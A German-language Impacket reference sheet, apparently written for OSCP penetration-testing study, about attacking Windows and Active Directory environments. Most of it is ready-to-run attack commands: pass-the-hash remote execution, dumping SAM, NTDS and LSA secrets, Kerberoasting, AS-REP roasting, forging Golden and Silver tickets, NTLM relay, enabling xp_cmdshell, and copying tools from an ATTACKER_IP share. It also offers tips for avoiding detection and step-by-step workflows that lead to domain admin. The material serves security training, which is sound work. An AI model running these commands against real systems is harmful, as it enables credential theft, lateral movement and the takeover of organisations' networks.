# Impacket Suite - Komplette Referenz

## Was ist Impacket?

Impacket ist eine Collection von Python-Scripts für Windows-Netzwerk-Protokolle. Essenziell für Pentesting von Windows/AD-Umgebungen.

**Wichtigste Tools:**
- Remote Execution: `psexec`, `wmiexec`, `smbexec`, `atexec`, `dcomexec`
- Credential Dumping: `secretsdump`, `sam dump`, `lsadump`
- Kerberos: `Get TGT`, `GetST`, `GetPac`, `ticketer`, `ticketConverter`
- SMB: `smbclient`, `smbserver`, `smbexec`
- MSSQL: `mssqlclient`
- Additional: `reg`, `services`, `rpcdump`, `ntlmrelayx`

---

## Installation

```bash
# Via apt (Kali)
sudo apt update
sudo apt install impacket-scripts

# Oder via pip
pip3 install impacket

# Oder von GitHub
git clone https://github.com/fortra/impacket
cd impacket
pip3 install .
```

---

## Remote Execution Tools

### psexec.py - Via Service Creation

**Am stabilsten, aber lautesten (erzeugt Event Logs)**

```bash
# Mit Password
impacket-psexec domain/user:password@IP

# Mit NTLM Hash
impacket-psexec -hashes :NTLM user@IP

# Lokaler User
impacket-psexec -local-auth admin:pass@IP

# Custom Service Name (weniger auffällig)
impacket-psexec -service-name "WindowsUpdate" user:pass@IP
```

**Wichtige Optionen:**
```bash
-hashes :NTLM              # Pass-the-Hash
-no-pass                   # Kein Passwort-Prompt
-k                         # Kerberos Auth
-dc-ip IP                  # DC IP
-target-ip IP              # Target IP (wenn anders als hostname)
-port 445                  # SMB Port
-service-name NAME         # Custom Service Name
-remote-binary-name NAME   # Custom Binary Name
```

### wmiexec.py - Via WMI

**Leiser als psexec, semi-interactive shell**

```bash
# Standard
impacket-wmiexec domain/user:password@IP

# Mit Hash
impacket-wmiexec -hashes :NTLM user@IP

# Kerberos
impacket-wmiexec -k -no-pass domain/user@hostname

# Single Command
impacket-wmiexec user:pass@IP "whoami"
```

**Vorteile:**
- Weniger Event Logs als psexec
- Kein Service Creation Event
- Funktioniert auch wenn psexec geblockt

**Nachteile:**
- Semi-interactive (kein vollwertiges CMD)
- Keine Output-Redirection

### smbexec.py - Via Service + Share

**Ähnlich wie psexec, aber keine Binary Upload**

```bash
# Standard
impacket-smbexec domain/user:password@IP

# Mit Hash
impacket-smbexec -hashes :NTLM user@IP

# Mode: SHARE (default) oder SERVER
impacket-smbexec -mode SERVER user:pass@IP
```

**Unterschiede zu psexec:**
- Nutzt Services, aber uploaded keine Binary
- Output via SMB Share
- Etwas langsamer

### atexec.py - Via Task Scheduler

**Single Command Execution, kein Shell**

```bash
# Command ausführen
impacket-atexec domain/user:password@IP "whoami"

# Mit Hash
impacket-atexec -hashes :NTLM user@IP "ipconfig"

# Output in Datei schreiben
impacket-atexec user:pass@IP "whoami > C:\\temp\\out.txt"
```

**Use Cases:**
- Single Commands
- Wenn andere Methoden geblockt sind
- File-less execution

### dcomexec.py - Via DCOM

**Remote Execution via DCOM Objects**

```bash
# Standard (MMC20.Application)
impacket-dcomexec domain/user:password@IP

# Mit Hash
impacket-dcomexec -hashes :NTLM user@IP

# Anderes DCOM Object
impacket-dcomexec -object ShellBrowserWindow user:pass@IP

# Verfügbare Objects
impacket-dcomexec -object MMC20 user:pass@IP         # Default
impacket-dcomexec -object ShellWindows user:pass@IP
impacket-dcomexec -object ShellBrowserWindow user:pass@IP
```

**OPSEC:**
- Sehr leise, wenig bekannt
- Schwer zu detecten
- Semi-interactive

---

## Credential Dumping

### secretsdump.py - Umfassendes Credential Dumping

**Das wichtigste Impacket-Tool für Credentials!**

#### SAM Database (Lokale Hashes)
```bash
# Remote SAM Dump (benötigt Admin)
impacket-secretsdump user:pass@IP

# Nur SAM
impacket-secretsdump -sam -security -system user:pass@IP
```

#### NTDS.dit (Domain Hashes - benötigt DA)
```bash
# NTDS Dump (alle Domain-Hashes)
impacket-secretsdump domain/user:password@DC-IP -just-dc

# Nur NTLM Hashes
impacket-secretsdump domain/user:pass@DC-IP -just-dc-ntlm

# Nur User Hashes (keine Computers)
impacket-secretsdump domain/user:pass@DC-IP -just-dc-user krbtgt

# Mit History
impacket-secretsdump domain/user:pass@DC-IP -just-dc -history
```

#### LSA Secrets
```bash
# LSA Secrets dumpen
impacket-secretsdump -lsa user:pass@IP
```

#### Mit verschiedenen Auth-Methods
```bash
# Mit Passwort
impacket-secretsdump domain/user:password@IP

# Mit NTLM Hash
impacket-secretsdump -hashes :NTLM user@IP

# Mit Kerberos
impacket-secretsdump -k -no-pass domain/user@DC-FQDN
```

#### Output-Optionen
```bash
# Output in Dateien
impacket-secretsdump domain/user:pass@IP -outputfile hashes

# Erstellt:
# hashes.ntds      - Domain Hashes
# hashes.sam       - SAM Hashes
# hashes.secrets   - LSA Secrets
```

#### VSS (Volume Shadow Copy)
```bash
# Via VSS (weniger invasiv)
impacket-secretsdump -use-vss domain/user:pass@DC-IP
```

#### Tipps
```bash
# Vollständiges DC-Dump
impacket-secretsdump -just-dc -history domain/administrator:pass@DC-IP -outputfile dc_dump

# Nur krbtgt Hash (für Golden Ticket)
impacket-secretsdump -just-dc-user krbtgt domain/admin:pass@DC-IP
```

---

## Kerberos Tools

### GetNPUsers.py - AS-REP Roasting

**Findet & roastet User ohne Kerberos Pre-Auth**

```bash
# User-Liste angeben
impacket-GetNPUsers domain/ -usersfile users.txt -dc-ip IP

# Mit credentials (um User zu enumerieren)
impacket-GetNPUsers domain/user:pass -dc-ip IP -request

# Output für Hashcat
impacket-GetNPUsers domain/user:pass -dc-ip IP -request -format hashcat

# Output für John
impacket-GetNPUsers domain/user:pass -dc-ip IP -request -format john

# Ohne Credentials (bei null session)
impacket-GetNPUsers domain/ -no-pass -usersfile users.txt -dc-ip IP
```

**Hash cracken:**
```bash
# Hashcat
hashcat -m 18200 hashes.txt wordlist.txt

# John
john --wordlist=wordlist.txt hashes.txt
```

### GetUserSPNs.py - Kerberoasting

**Requestet TGS-Tickets für Service-Accounts**

```bash
# Alle SPNs finden & TGS requesten
impacket-GetUserSPNs domain/user:password -dc-ip IP -request

# Output für Hashcat
impacket-GetUserSPNs domain/user:pass -dc-ip IP -request -outputfile spn.txt

# Nur bestimmten SPN
impacket-GetUserSPNs domain/user:pass -dc-ip IP -request-user target_user
```

**Hash cracken:**
```bash
# Hashcat (TGS-REP)
hashcat -m 13100 spn.txt wordlist.txt

# John
john --wordlist=wordlist.txt spn.txt
```

### GetTGT.py - TGT Ticket requesten

**Requestet TGT (Ticket Granting Ticket)**

```bash
# Mit Passwort
impacket-GetTGT domain/user:password

# Mit NTLM Hash
impacket-GetTGT domain/user -hashes :NTLM

# Mit AES Key
impacket-GetTGT domain/user -aesKey AES_KEY

# Output
impacket-GetTGT domain/user:pass -dc-ip IP
# Erstellt: user.ccache

# Ticket nutzen
export KRB5CCNAME=user.ccache
impacket-psexec -k -no-pass domain/user@hostname
```

### GetST.py - Service Ticket requesten

**Requestet TGS (Service Ticket)**

```bash
# Service Ticket für CIFS
impacket-GetST domain/user:password -spn cifs/target.domain.local

# Mit TGT
export KRB5CCNAME=user.ccache
impacket-GetST -k -no-pass -spn cifs/target.domain.local domain/user

# Impersonation (S4U2Self)
impacket-GetST domain/user:pass -spn cifs/target -impersonate Administrator
```

### ticketer.py - Golden/Silver Tickets erstellen

**Erstellt gefälschte Kerberos-Tickets**

#### Golden Ticket (Domain-weiter Zugriff)
```bash
# Benötigt:
# - krbtgt NTLM Hash
# - Domain SID
# - Domain Name

impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain DOMAIN.LOCAL administrator

# Erstellt: administrator.ccache

# Nutzen
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass domain.local/administrator@dc.domain.local
```

#### Silver Ticket (Service-spezifisch)
```bash
# Benötigt: Computer/Service NTLM Hash

impacket-ticketer -nthash SERVICE_HASH -domain-sid DOMAIN_SID \
  -domain DOMAIN.LOCAL -spn cifs/target.domain.local administrator

export KRB5CCNAME=administrator.ccache
impacket-smbclient -k -no-pass //target.domain.local/C$
```

#### TGT mit Extra-SIDs (SID History Attack)
```bash
# Enterprise Admin SID hinzufügen
impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID \
  -domain DOMAIN.LOCAL -extra-sid ENTERPRISE_ADMINS_SID administrator
```

---

## SMB Tools

### smbclient.py - SMB Interaktion

```bash
# Shares auflisten
impacket-smbclient domain/user:pass@IP

# In Shell
shares              # Alle Shares
use SHARE_NAME      # Share wechseln
ls                  # Dateien listen
cd DIR              # Directory wechseln
get file.txt        # Download
put file.txt        # Upload
```

### smbserver.py - SMB Server starten

**Essenziell für File-Transfer!**

```bash
# Standard Share
impacket-smbserver share /path/to/folder

# Mit Username/Password
impacket-smbserver share /path/to/folder -username user -password pass

# SMB2 Support
impacket-smbserver share /path/to/folder -smb2support

# Von Windows aus zugreifen
\\ATTACKER_IP\share\file.exe
copy file.txt \\ATTACKER_IP\share\
```

**Credentials auf Windows setzen:**
```cmd
# Net use für Auth
net use \\ATTACKER_IP\share /user:user pass

# Dann zugreifen
copy \\ATTACKER_IP\share\tool.exe C:\Temp\
```

---

## MSSQL Tools

### mssqlclient.py - MSSQL Shell

```bash
# Standard Connection
impacket-mssqlclient user:pass@IP

# Windows Auth
impacket-mssqlclient domain/user:pass@IP -windows-auth

# Mit Hash
impacket-mssqlclient -hashes :NTLM user@IP -windows-auth
```

**In der SQL-Shell:**
```sql
-- Queries
SELECT @@version;
SELECT SYSTEM_USER;

-- xp_cmdshell aktivieren
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Commands ausführen
xp_cmdshell 'whoami';
```

**Impacket Shortcuts:**
```bash
# In mssqlclient Shell
enable_xp_cmdshell         # xp_cmdshell enablen
xp_cmdshell whoami         # Command ausführen
```

---

## Registry & Services

### reg.py - Remote Registry

```bash
# Query Registry
impacket-reg domain/user:pass@IP query -keyName HKLM\\SOFTWARE

# Backup SAM/SYSTEM (für offline Hash-Extraction)
impacket-reg domain/user:pass@IP backup -keyName HKLM\\SAM
impacket-reg domain/user:pass@IP backup -keyName HKLM\\SYSTEM
impacket-reg domain/user:pass@IP backup -keyName HKLM\\SECURITY
```

### services.py - Service Management

```bash
# Services auflisten
impacket-services domain/user:pass@IP list

# Service starten/stoppen
impacket-services domain/user:pass@IP start SERVICE_NAME
impacket-services domain/user:pass@IP stop SERVICE_NAME

# Service erstellen
impacket-services domain/user:pass@IP create -name MyService -display "My Service" \
  -path "C:\\Windows\\System32\\calc.exe"

# Service löschen
impacket-services domain/user:pass@IP delete SERVICE_NAME
```

---

## NTLM Relay

### ntlmrelayx.py - NTLM Relay Attacks

**Wichtig für NTLM Relay-Angriffe**

#### Relay to SMB
```bash
# Standard SMB Relay
impacket-ntlmrelayx -t 192.168.1.100 -smb2support

# Mit Command Execution
impacket-ntlmrelayx -t 192.168.1.100 -smb2support -c "whoami"

# Dump SAM
impacket-ntlmrelayx -t 192.168.1.100 -smb2support --dump-sam

# Dump LSA
impacket-ntlmrelayx -t 192.168.1.100 -smb2support --dump-lsa

# Interactive Shell
impacket-ntlmrelayx -t 192.168.1.100 -smb2support -i
# Öffnet SOCKS Proxy auf 127.0.0.1:1080
```

#### Relay to LDAP (mit Delegation)
```bash
# Delegate Access
impacket-ntlmrelayx -t ldap://DC-IP --delegate-access

# Erstellt Computer-Account für Relay-Angriffe
```

#### Mit Target-Liste
```bash
# targets.txt enthält IPs
impacket-ntlmrelayx -tf targets.txt -smb2support
```

---

## Weitere nützliche Tools

### rpcdump.py - RPC Enumeration

```bash
# RPC Endpoints auflisten
impacket-rpcdump domain/user:pass@IP

# Bestimmtes Protokoll
impacket-rpcdump -port 135 IP
```

### lookupsid.py - SID Enumeration

```bash
# SID Brute-Force (User Enumeration)
impacket-lookupsid domain/user:pass@IP

# Null Session
impacket-lookupsid guest@IP
```

### getArch.py - Target-Architektur bestimmen

```bash
# x86 oder x64?
impacket-getArch -target IP
```

### addcomputer.py - Computer-Account erstellen

```bash
# Computer-Account zur Domain hinzufügen
impacket-addcomputer domain/user:pass -computer-name MYPC$ -computer-pass MyPassword123

# Für Delegation-Angriffe
```

---

## Praktische OSCP-Workflows

### Workflow 1: Von Credentials zu DA

```bash
# 1. Credentials validieren
crackmapexec smb IP -u user -p pass

# 2. Check Admin-Rechte
crackmapexec smb IP -u user -p pass --shares

# 3. Wenn Admin: SAM dumpen
impacket-secretsdump user:pass@IP

# 4. Mit NTLM zu anderen Systemen
impacket-wmiexec -hashes :NTLM administrator@IP2

# 5. Wenn DC: NTDS dumpen
impacket-secretsdump -just-dc domain/admin:pass@DC-IP

# 6. Golden Ticket oder PTH zu DA
```

### Workflow 2: Kerberoasting

```bash
# 1. SPNs finden
impacket-GetUserSPNs domain/user:pass -dc-ip IP -request -outputfile spn.txt

# 2. Cracken
hashcat -m 13100 spn.txt /usr/share/wordlists/rockyou.txt

# 3. Mit gecr acktem Passwort weiter
impacket-psexec domain/sqlservice:Password123@TARGET
```

### Workflow 3: AS-REP Roasting

```bash
# 1. User ohne Pre-Auth finden
impacket-GetNPUsers domain/ -usersfile users.txt -dc-ip IP -format hashcat

# 2. Cracken
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# 3. Mit Credentials weitermachen
```

### Workflow 4: Golden Ticket

```bash
# 1. NTDS dumpen (benötigt DA)
impacket-secretsdump -just-dc domain/admin:pass@DC-IP > ntds.txt

# 2. krbtgt Hash extrahieren
grep krbtgt ntds.txt

# 3. Domain SID bekommen
# Aus secretsdump output oder:
impacket-lookupsid domain/user:pass@DC-IP | grep "Domain SID"

# 4. Golden Ticket erstellen
impacket-ticketer -nthash KRBTGT_NTLM -domain-sid S-1-5-21-... \
  -domain CORP.LOCAL FakeAdmin

# 5. Nutzen
export KRB5CCNAME=FakeAdmin.ccache
impacket-psexec -k -no-pass corp.local/FakeAdmin@dc01.corp.local
```

---

## Authentication Methods Vergleich

| Method | Kommando | Use Case |
|--------|----------|----------|
| **Password** | `user:pass@IP` | Normale Auth |
| **NTLM Hash** | `-hashes :NTLM user@IP` | Pass-the-Hash |
| **LM:NTLM** | `-hashes LM:NTLM user@IP` | Alte Systeme |
| **Kerberos** | `-k -no-pass user@FQDN` | Kerberos-Only Envs |
| **AES Key** | `-aesKey KEY user@IP` | Kerberos AES |
| **Ticket** | `export KRB5CCNAME=file` | Ticket Reuse |

---

## Tipps & Tricks

### 1. Impacket mit Proxychains
```bash
proxychains impacket-secretsdump domain/user:pass@IP
```

### 2. Kerberos Troubleshooting
```bash
# /etc/hosts muss gesetzt sein!
echo "IP  dc01.corp.local corp.local dc01" | sudo tee -a /etc/hosts

# Kerberos Config
export KRB5CCNAME=/tmp/ticket.ccache

# Zeit synchronisieren
sudo ntpdate DC-IP
```

### 3. Output in Dateien
```bash
# Secretsdump
impacket-secretsdump domain/user:pass@IP -outputfile loot

# Kerberoasting
impacket-GetUserSPNs domain/user:pass -dc-ip IP -request -outputfile spn.txt
```

### 4. Domain vs Lokaler User
```bash
# Domain
impacket-psexec domain/user:pass@IP

# Lokal
impacket-psexec -local-auth ./admin:pass@IP
# Oder
impacket-psexec admin:pass@IP -no-pass
```

---

## Quick Reference

| Tool | Verwendung |
|------|------------|
| `psexec` | Stabilste Remote Shell via SMB |
| `wmiexec` | Leise Shell via WMI |
| `secretsdump` | Credentials dumpen (SAM/NTDS/LSA) |
| `GetUserSPNs` | Kerberoasting |
| `GetNPUsers` | AS-REP Roasting |
| `GetTGT` | TGT requesten |
| `ticketer` | Golden/Silver Tickets |
| `smbserver` | File-Transfer via SMB |
| `mssqlclient` | MSSQL Shell |
| `ntlmrelayx` | NTLM Relay Attacks |

---

## Wichtig für OSCP

1. **secretsdump** - Credentials sind alles!
2. **psexec/wmiexec** - Lateral Movement
3. **smbserver** - File-Transfer zum/vom Target
4. **Kerberoasting** - Oft einfachster Weg zu privilegiertem Account
5. **Pass-the-Hash** - `-hashes :NTLM` funktioniert fast überall
6. **NTDS Dump** - Bei DA immer machen für vollständigen Zugriff
